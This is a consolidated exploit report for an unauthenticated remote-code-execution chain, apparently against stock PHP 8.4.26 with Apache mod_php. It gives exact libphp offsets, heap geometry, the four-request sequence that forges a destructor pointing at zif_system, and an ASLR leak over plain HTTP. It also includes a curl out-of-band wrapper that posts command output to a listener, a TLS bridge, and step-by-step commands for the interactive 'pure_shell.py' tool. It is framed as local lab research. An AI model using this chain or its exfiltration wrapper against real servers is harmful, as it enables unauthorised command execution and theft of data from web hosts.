# PHP2SHELL — CVE-2026-109618 / CVE-2026-109619

## Consolidated report — stock PHP 8.4.26 Apache mod_php target

**Date:** 2026-10-23
**Scope:** local Docker labs only; no live-target probing was performed.
**Primary deliverable:** `official-lab/pure_shell.py` — one interactive
exploit tool, with reproducible lab setup and evidence on disk.

---

## 1. Executive summary

The report-defined target — `php:8.4.26-apache`, Debian 13 trixie, PHP
8.4.26 NTS, Apache 2.4.69 prefork with mod_php, stock `php.ini-production`,
and a page whose whole content is `<?php echo "OK\n"; ?>` — is exploitable
end to end with **no application-side PHP and no authentication**. The chain
uses the PHP session upload-progress callback before RINIT, defeats ASLR over
pure HTTP with an in-band heap/libphp leak, and reaches `zif_system` through
a forged `zend_reference` / `zend_array` destructor. Command execution runs
as `www-data` (`uid=33`). The public report labels the issue CVSS 9.2
critical; this lab confirms the engine-level RCE on the stock stack.

The chain was reproduced with the public 9bie reference (7/7), then packaged
as an interactive tool that completed 11/11 proof-producing commands on the
official target. The same tool extends the chain to a bounded four-worker
prefork pool and adds two remote-delivery paths: out-of-band command output
through `curl` (`--oob`) and TLS through a loopback plain-TCP → TLS bridge
(`--https`). Both were validated on the 8.4.26 target, including a full
TLS + OOB run that returned `uid=33(www-data)` at the callback listener.

Two earlier supporting ports — mod_php 8.3.33 and FPM 8.3.35 — also reached
engine-level RCE, but each required an application precondition (an
`unserialize` sink or a session-write endpoint). They are reported separately
and are **not** part of the stock-8.4.26 claim.

---

## 2. Target profile

| Property | Value |
|---|---|
| Image | `php:8.4.26-apache` |
| Image digest | `sha256:60111400ff77bdc44fa79b4f072afe49a42abba71e0846ad496be4761dc9c11a` |
| OS | Debian GNU/Linux 13 (trixie) |
| PHP | 8.4.26 NTS, 64-bit, mod_php (`libphp.so`) |
| `libphp.so` SHA-256 | `51663cf883b1223436d4c99f31dd0225735ea5573665e4242621eee7f4ee679c` |
| Apache | 2.4.69 (Debian), prefork |
| Single-worker lab | one prefork child, `KeepAlive Off`, port 18110 |
| Multi-worker lab | bounded 4-worker prefork pool, `KeepAlive On`, port 18112 |
| ini | stock `php.ini-production`: `display_errors=Off`, `memory_limit=128M`, `post_max_size=8M`, `output_buffering=0` |
| Target page | `<?php echo "OK\n"; ?>` |
| Application prerequisites | none; `session.upload_progress` is enabled by default |

Offsets and geometry on this build:

```
zif_system      = libphp + 0x465370
zval_ptr_dtor   = libphp + 0x65eb60
main bucket count = 87
FAKE_ARRAY_DELTA  = 0xF8398
```

The tool re-derives `libphp` and the heap main chunk from the B1 leak on
every command. Addresses are stable across prefork child respawns while the
master lives; a container/master restart changes them and the next command
re-leaks. This is the reason the chain remains viable after a restart.

---

## 3. Findings

| ID | Finding | Severity | Verification | Evidence |
|---|---|---|---|---|
| F-01 | Engine-level RCE on stock 8.4.26 mod_php through the session upload-progress / unserializer destructor chain | CRITICAL | SOLID | `official-lab/EVIDENCE.md` §2–3 |
| F-02 | Pure-HTTP ASLR defeat: stale-id B1 leak returns heap chunk and `libphp` base in a `Set-Cookie` header | CRITICAL | SOLID | §4 below; `evidence/pure_shell_leak.log` |
| F-03 | The same chain executes on a bounded 4-worker prefork pool using controlled A1/A2 waves | HIGH | SOLID (4-worker) | `evidence/multi/` |
| F-04 | Command output can leave the target through an out-of-band `curl` callback, with no `/out` dependency | INFO | SOLID | `evidence/oob_id.txt`, `evidence/multi/oob_multi_id.txt` |
| F-05 | The tool can drive an HTTPS endpoint through a loopback TLS bridge; a TCP-level TLS terminator preserves the full chain | INFO | SOLID (TCP terminator); HTTP proxy caveat | `evidence/tool_tls_oob_id.log`, `evidence/tls/` |
| F-06 | mod_php 8.3.33 with an `unserialize($_POST['data'])` application sink reaches RCE | HIGH | SOLID (app precondition) | `modphp-lab/evidence/` |
| F-07 | FPM 8.3.35 with a session-write/alias application precondition reaches RCE, 5/5 | HIGH | SOLID (app precondition) | `fpm-lab/evidence/` |
| F-08 | The public mod_php pure-HTTP ASLR leak does not transfer to FPM; an FPM address leak still requires calibration or an application leak | — | NEGATIVE/UNVERIFIABLE for a pure-HTTP FPM path | `fpm-lab/CALIBRATION.md` |

Unless prefixed with `modphp-lab/` or `fpm-lab/`, evidence paths in the
findings table are relative to `official-lab/`.

F-01/F-02 are the report-defined result. F-03–F-05 extend delivery and
scheduling. F-06/F-07 are supporting ports with explicit preconditions.

---

## 4. The chain

The target runs PHP's session upload-progress callback before RINIT. Four
requests shape the engine state:

```
A1  END-cleanup send_cookie OOM
    Leaves the session id and send_cookie state across the request.

B1  stale-id OOB read
    A chunked request whose stale session id produces an out-of-bounds read;
    the response carries the leak in a Set-Cookie header.

A2  cheap-OOM
    Frees the session variables and leaves PS(http_session_vars) dangling.

B2  fake zend_reference + fake zend_array
    pDestructor is overwritten with zif_system; arData points at the command
    string. The destructor runs at request shutdown and executes the command.
```

The B1 response is large (~1.68 MB); the leak parser finds
`zval_ptr_dtor`, subtracts `0x65eb60` for the `libphp` base, identifies the
87-bucket heap main chunk, and computes `S = main + 0xF8398` and
`zif_system = libphp + 0x465370`. Representative logged addresses:

```
single-worker, final regression:
  zval_ptr_dtor=0x7f900d6e3b60 -> libphp=0x7f900d085000
  main=0x7f900b400000 S=0x7f900b4f8398 zif_system=0x7f900d4ea370

TLS + OOB full chain:
  zval_ptr_dtor=0x7f16420c6b60 -> libphp=0x7f1641a68000
  main=0x7f163fe00000 S=0x7f163fef8398 zif_system=0x7f1641ecd370
```

The command is wrapped to fit the 200-byte `mk_ht.py` limit:

```
/out mode:  rm -f /out/oXXXXXXXX; (CMD) > /out/oXXXXXXXX 2>&1
--oob mode: (CMD) > /tmp/.p2s 2>&1; curl -s --data-binary @/tmp/.p2s URL
```

The `/out` wrapper leaves about 154 bytes for the command; the `--oob`
wrapper leaves about 100 bytes depending on the callback URL.

---

## 5. Single-worker result

Lab: `official-lab/run.sh` → `127.0.0.1:18110`, container
`DESKTOP-GQ7T0MS`, one prefork child.

- Reference 9bie `exploit.py`: 7/7 successful runs on the same image/config.
- Interactive tool: 11/11 proof-producing commands, including
  `id`, `uname -a`, `cat /etc/passwd`, `ls`, REPL `shell`, and a
  `--restart auto` run with fresh ASLR.
- Post-multi regression: `id; uname -a` → proof `o373671a0`, `uid=33`.
- Post-TLS/OOB regression: `id; uname -a` on a freshly restarted target →
  proof `o2e7b4073` on the first try:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux bcbcbe31657c 5.15.153.1-microsoft-standard-WSL2 ... x86_64 GNU/Linux
```

Evidence: `evidence/proof_single_final.txt`, `evidence/tool_single_final.log`,
and the 11-command table in `EVIDENCE.md` §3.

---

## 6. Multi-worker result

Lab: `official-lab/run_multi.sh` → `127.0.0.1:18112`, container
`p2s-multi-18112`, bounded 4-worker prefork pool.

The multi path reuses the same bodies, image, ini, and offsets. Only
scheduling changes: A1 is sprayed at four-way concurrency; B1 reads the leak
from any poisoned child; A2 is sprayed in two waves of eight; B2 goes to an
A2-poisoned child. Proof is the command output file, not the B2 HTTP status
(a successful B2 often returns `EOF`/500).

Validated:

- 4-worker pool, `--multi --exec 'id'` → `multi-out/o64bd996b`,
  `uid=33(www-data)`.
- PID evidence: A1 hit the initial workers; B1 leaked from one of them; A2
  hit the same pool; B2 ran; the proof was written.
- Negative controls: an 8-connection A1 wave was rejected; an unbounded /
  growing prefork pool outran the A1 wave and B2 landed on a fresh child;
  A2 → B2 HTTP pipelining failed; `--multi` against the single-worker
  official target failed at B1 (expected).
- Bounded 4-worker defaults:
  `--a1-workers 4 --a1-waves 1 --b1-retries 3 --a2-workers 8 --a2-waves 2
  --b2-retries 3`.

A bounded pool is mandatory for the multi strategy. Larger pools need a
larger A1 wave; the 4-worker configuration is the one fully verified.

Evidence: `evidence/multi/README.md`, `evidence/multi/tool_multi_id.log`,
`evidence/multi/proof_tool_multi_id.txt`, and the PID/negative logs in
`evidence/multi/experiments/`.

---

## 7. Remote output: `--oob`

The default `exec` reads the target's `/out` bind mount. For a remote target,
`--oob URL` instead wraps the command with `curl`:

```
(CMD) > /tmp/.p2s 2>&1; curl -s --data-binary @/tmp/.p2s URL
```

The stock image has `/usr/bin/curl` and a reachable listener is the only
requirement. The lab listener is `experiments/run_oob_listener.sh`: a second
`php:8.4.26-apache` container on the default Docker bridge running PHP's
built-in server, capturing POST bodies to `oob-out/oob.txt`. No host port
forwarding or `host.docker.internal` assumptions are involved.

Validated captures:

| Target | Command | Capture | Source |
|---|---|---|---|
| single-worker | `--oob http://172.17.0.4:18999/ --exec 'id'` | `evidence/oob_id.txt` | `172.17.0.2` |
| multi-worker | `--multi --oob ... --exec 'id'` | `evidence/multi/oob_multi_id.txt` | `172.17.0.3` |

Both contain `uid=33(www-data) gid=33(www-data) groups=33(www-data)`. The
tool returns after B2 without reading `/out`; the B2 status is often `EOF`.

---

## 8. TLS: `--https`

`--https` does not modify the HTTP payloads. The tool starts a loopback
plain-TCP listener, points the senders at it, and for each connection opens a
TLS connection to the real target, rewrites `Host` to the real host or
`--sni`, applies SNI, and pumps both directions. This preserves chunked
bodies and the 1.68 MB B1 response. `--insecure` disables certificate
verification.

Validated path — a raw TCP-level TLS terminator
(`experiments/tls_tcp_forward.py`, TLS on `127.0.0.1:18444` → plain HTTP
target on `127.0.0.1:18110`):

```
full:  TLS bridge -> decoded=819208 -> libphp=0x7f1641a68000
       main=0x7f163fe00000 S=0x7f163fef8398
       zif_system=0x7f1641ecd370
       B2 + OOB -> uid=33(www-data)
```

Evidence: `evidence/tool_tls_oob_id.log`, `evidence/oob_tls_id.txt`. The
nginx leak evidence is `evidence/tool_tls_leak.log` and is discussed below.

HTTP reverse-proxy caveat: an nginx TLS proxy also works for the **leak**,
but the B1 response is ~1.68 MB and its `Set-Cookie` header exceeds the
default nginx header buffers (4–8 KB), which return a 502
(`upstream sent too big header ...`). Raising
`proxy_buffer_size 4m` / `proxy_buffers 8 4m` fixes the leak: the nginx leak
returned `libphp=0x7fbbc7d3b000` (`evidence/tool_tls_leak.log`). The full
chain through that HTTP proxy failed 3/3 in `evidence/tool_tls_oob_id.log`
(the 18443 block) because the target's child lifecycle changed. The supported
full-chain TLS path is mod_ssl or a TCP-level terminator. See
`docker/nginx-tls.conf`, `evidence/tls/nginx_p2s_tls.log`, and
`CALIBRATION.md` §9.3.

---

## 9. Supporting ports (app preconditions, not the stock-target claim)

### 9.1 mod_php 8.3.33

`modphp-lab/` ports the chain to `php:8.3.33-apache` with a deliberately
vulnerable application sink (`@unserialize($_POST['data'])`). The tool
reaches `uid=33(www-data)`; calibrated values on that master:

```
D          = 0x7fdb5ca6c000
system     = 0x7fdb5f919090  (libc + 0x53090)
struct_off = 0x1fe8
```

Evidence: `modphp-lab/evidence/modphp_uid.txt`, `modphp_id.txt`,
`modphp_multi.txt`, `modphp_gdb.out`. This is an app-precondition port, not
a no-app-code result.

### 9.2 FPM 8.3.35

`fpm-lab/` reaches RCE 5/5 with a session-write/alias application
precondition (`store.php` writes a 65,500-byte value and aliases it; A is an
application-level decoder OOM; B is an upload-progress decode on the same
worker). Calibrated values on that master:

```
D      = 0x7f886e26c000
libc   = 0x7f886f06c000
system = 0x7f886f0bf090  (libc + 0x53090)
```

Evidence: `fpm-lab/evidence/rce_uid.txt`,
`fpm-lab/evidence/m3_app_uid.txt`, `m3_app_gdb.out`,
`m3_app_pure.out`, `m3_app_pure2.out`, `m3_app_session.txt`.

FPM ASLR leak: negative result. The mod_php pre-RINIT `send_cookie` /
`PS(id)` leak does not transfer; the public path needs either calibrated
addresses or an application-level leak. No complete pure-HTTP FPM ASLR
bypass is claimed.

---

## 10. Evidence manifest

| Path | Content |
|---|---|
| `official-lab/EVIDENCE.md` | full official-target evidence, commands, proof table, integrity hashes |
| `official-lab/README.md` | quick start, interactive commands, limitations, file map |
| `official-lab/CALIBRATION.md` | offsets, heap geometry, leak parser, multi scheduling, TLS/OOB |
| `official-lab/evidence/` | target identity, reference runs, 11 tool runs, proofs, OOB/TLS captures |
| `official-lab/evidence/multi/` | 4-worker identity, PID log, leak, proof, negative controls |
| `official-lab/evidence/tls/` | nginx TLS proxy config/log, TCP terminator, OOB listener, target identity |
| `official-lab/experiments/ERROR_LEDGER.md` | 15 failure → root-cause → fix entries |
| `modphp-lab/` | 8.3.33 mod_php app-precondition port and evidence |
| `fpm-lab/` | 8.3.35 FPM app-precondition port, FPM ASLR negative result, evidence |

The integrity block in `official-lab/EVIDENCE.md` §7 lists SHA-256 hashes for
the tool, both lab launchers, the payloads, the TLS proxy/terminator, the
OOB listener, and the error ledger.

---

## 11. Limitations and open items

- **Version matrix.** Only the stock 8.4.26 mod_php build is fully verified
  for the no-app-code chain. 8.3.33 mod_php and 8.3.35 FPM were verified as
  app-precondition ports. 8.5.11 uses a different carrier/prerequisite set
  (`zif_system 0x5996e0`, `zval_ptr_dtor 0x7b47a0` in the public port;
  `display_errors` and memory settings differ) and is not interchangeable.
- **Patched negative controls.** 8.4.27 / 8.5.12 patched images were not
  tested; availability was not established. The FPM note records that
  `php:8.3-fpm` resolved to the patched 8.3.36 and that state did not
  survive there.
- **Multi-worker scope.** The multi path is validated on the bounded
  4-worker pool only. Unbounded or larger pools need a larger A1 wave and
  are not claimed.
- **TLS through HTTP proxies.** The leak works through nginx with 4 MB
  header buffers; the full chain through the HTTP proxy is not stable.
  mod_ssl or a TCP-level terminator is the supported path.
- **Command length.** 200 bytes including the wrapper; the `--oob` URL
  reduces the command budget.
- **Remote prerequisites.** `--oob` requires `curl` on the target and a
  reachable listener; the stock image has curl.
- **Target container ID.** The official target is recreated/restarted
  between runs; the image digest, PHP/Apache versions, ini, and libphp hash
  are the stable identity. A transient `docker exec` failure after a restart
  is recorded in `evidence/tls/target_tls.txt`; the target served the chain.
- **Reference script.** `php2shell-ref/exploit/cve/remote_cve.py` remains
  unvalidated; the working reference is 9bie's `exploit.py`.
- **No live target.** All runs are local Docker targets. No external host
  was probed.

---

## 12. Reproduction

```bash
# from the repository root
cd official-lab

# single-worker stock target
./run.sh
python3 pure_shell.py --leak
python3 pure_shell.py --exec 'id; uname -a'

# fresh ASLR through the Docker shim
python3 pure_shell.py --restart auto --exec 'id'

# bounded four-worker pool
./run_multi.sh
python3 pure_shell.py --port 18112 --multi --outdir multi-out --exec 'id'

# out-of-band output
./experiments/run_oob_listener.sh
python3 pure_shell.py --port 18110 \
  --oob 'http://<listener-ip>:18999/' --exec 'id'

# TLS with a raw TCP-level terminator
python3 experiments/tls_tcp_forward.py \
  --cert docker/tls/cert.pem --key docker/tls/key.pem \
  --port 18444 --target-port 18110 &
python3 pure_shell.py --port 18444 --https --insecure \
  --oob 'http://<listener-ip>:18999/' --exec 'id'
```

The interactive tool:

```
python3 pure_shell.py
php2shell> exec id
php2shell> shell
python3(target)> cat /etc/passwd | head -3
php2shell> leak
php2shell> set oob http://<listener>:18999/
php2shell> set tls on
php2shell> set insecure on
```

---

## 13. Verdict

**The stock `php:8.4.26-apache` target defined by the report is exploitable
to engine-level command execution without application code or
authentication.** The pure-HTTP ASLR bypass, the single-worker chain, the
bounded multi-worker extension, the out-of-band output path, and the TLS
transport are all backed by reproducible local evidence. The deliverable is
one interactive tool plus the lab launchers, calibration notes, error ledger,
and evidence pack.

The remaining work is coverage, not the primary result: additional 8.5.x
calibration, patched-image negative controls, larger multi-worker pools, and
a stable HTTP-proxy TLS path. Those are explicitly out of the validated set
and are not claimed.
